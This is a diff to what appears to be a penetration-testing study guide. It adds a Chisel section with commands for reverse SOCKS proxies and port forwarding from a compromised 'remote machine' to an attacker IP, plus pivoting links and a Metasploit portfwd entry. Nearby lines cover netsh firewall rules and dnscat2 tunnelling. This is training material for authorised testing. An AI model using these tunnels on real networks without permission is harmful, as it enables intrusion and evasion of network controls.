@@ -145,8 +145,9 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [ssh.exe](#sshexe)
     - [Plink.exe](#plinkexe)
     - [Netsh](#netsh)
-    - [HTTP Tunneling](#http-tunneling)
+    - [Chisel](#chisel)
     - [DNS Tunneling](#dns-tunneling)
+    - [Metasploit Portfwd](#metasploit-portfwd)
   - [Linux Privilege Escalation](#linux-privilege-escalation)
     - [Resources](#resources-2)
     - [Strategy](#strategy)
@@ -3872,11 +3873,12 @@ Other notes:
 
 ## Port Redirection and Tunneling
 
-**Tools**
+**Tools and notes**
 - [rinetd](https://github.com/samhocevar/rinetd)
 - [ProxyChains](https://github.com/haad/proxychains)
 - [Plink.exe](https://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
 - [HTTPTunnel](https://github.com/larsbrinkhoff/httptunnel)
+- [PWK Notes: Tunneling and Pivoting](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)
 
 ### <ins>Port Forwarding</ins>
 
@@ -3961,9 +3963,47 @@ The first time plink connects to a host, it will attempt to cache the host key i
 `netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<IP> localport=<port> action=allow`
 
 
-### <ins>HTTP Tunneling</ins>
+### <ins>Chisel</ins>
 
-#### <ins>Chisel</ins>
+- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
+- https://ap3x.github.io/posts/pivoting-with-chisel/
+- https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
+- https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
+- to have the process in the background, use & at the end of the command
+
+**Port forwarding with chisel**: https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
+```
+./chisel server -p 9999 --reverse
+./chisel client 192.168.45.193:9999 R:8000:socks                <# dynamic port forwarding #>
+./chisel.exe client 192.168.45.193:9999 R:8090:localhost:80     <# port forwarding port 80 
+                                                                     connect then to localhost:8090 
+                                                                     usefull for /phpmyadmin/ #>
+```
+
+**Proxy**
+1. on the attacker machine: `chisel server -p LISTEN_PORT --reverse`
+2. on the remote machine: `.\chisel.exe client ATTACKING_IP:LOCAL_OPEN_PORT R:LISTEN_PORT:socks`
+
+**Reverse SOCKS Proxy**
+1. On the attacker machine: `chisel server -p LISTEN_PORT --reverse`
+2. On the remote machine: `./chisel client ATTACKING_IP:LISTEN_PORT R:socks`
+3. `sudo nano /etc/proxychains.conf`
+   comment everything under `[ProxyList]` and add a new line `socks5 127.0.0.1 LISTEN_PORT`
+   + you can also add FoxyProxy > `socks5 127.0.0.1 4242`
+
+**Forward SOCKS Proxy**
+1. On the remote machine: `./chisel server -p LISTEN_PORT --socks5`
+2. On the attacker machine: `chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`
+
+**Remote Port Forward**
+1. On the attacker machine: `./chisel server -p LISTEN_PORT --reverse`
+2. On the remote machine: `./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT`
+
+**Local port forwarding**
+1. On the remote machine: `chisel server -p LISTEN_PORT`
+2. On the attacker machine: `.\chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`
+
+**HTTP Tunneling**
 1. The machines are `KALI01`, `DMZ01` and `INTERNAL01`
    - `KALI01` will listen on TCP port `1080`, a SOCKS proxy port
 2. In `KALI01`, copy the [Chisel](https://www.kali.org/tools/chisel/) binary to the Apache2 server folder `sudo cp $(which chisel) /var/www/html/` and start Apache2 `sudo systemctl start apache2`
@@ -3978,6 +4018,7 @@ The first time plink connects to a host, it will attempt to cache the host key i
      - `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
      - `%h` and `%p` tokens represent the SSH command host and port values
    - Another option is to use ProxyChains by adding `socks5 127.0.0.1 1080` to `/etc/proxychains.conf` and prepending `sudo proxychains` to each command we want to run
+
 
 ### <ins>DNS Tunneling</ins>
 
@@ -4006,6 +4047,8 @@ The first time plink connects to a host, it will attempt to cache the host key i
 3. From `dnscat2-server` > `window -i 1` > `listen 127.0.0.1:<lister-PORT> <IP>:<PORT>`
    - `<IP>:<PORT>` = machine from `INTERNAL` 
 
+### <ins>Metasploit Portfwd</ins>
+- [Metasploit Unleashed - Portfwd](https://www.offsec.com/metasploit-unleashed/portfwd/)
 
 ### <ins>Linux Privilege Escalation</ins>
 
